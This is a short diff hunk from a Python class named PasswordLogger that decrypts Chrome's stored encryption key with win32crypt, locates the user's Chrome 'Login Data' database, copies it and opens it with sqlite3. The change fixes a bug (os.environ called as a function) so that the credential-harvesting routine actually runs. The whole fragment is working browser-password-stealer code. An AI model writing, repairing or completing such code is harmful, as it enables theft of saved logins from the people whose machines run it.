@@ -29,7 +29,7 @@ class PasswordLogger:
                 encryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
             except: 
                 time.sleep(1)
-            db_path = os.path.join(os.environ("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
             file_name = "ChromeData.db"
             shutil.copyfile(db_path, file_name)
             conn = sqlite3.connect(file_name)
